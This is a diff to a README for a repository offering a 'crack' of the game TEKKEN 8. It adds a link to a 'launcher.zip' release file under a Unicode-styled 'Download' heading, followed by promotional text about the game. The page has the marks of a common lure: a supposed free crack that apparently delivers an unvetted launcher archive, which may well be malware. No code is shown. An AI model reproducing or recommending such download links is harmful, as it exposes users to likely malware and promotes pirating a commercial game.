@@ -1,6 +1,6 @@
 # tekken-8-Crck-2024-free
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/johnmoistegg/tekken-8-Crck-2024-free/releases/download/tekken-8-Crck-2024-free/launcher.zip)
 
 
 Meet TEKKEN 8, the next chapter of the legendary fighting game franchise. The intense battles typical of the TEKKEN series have become even better thanks to realistic graphics that squeeze the most out of modern equipment, and character models worked out to the smallest detail that were created from scratch. And colorful and destructible battle locations allow you to plunge into the exciting gameplay.
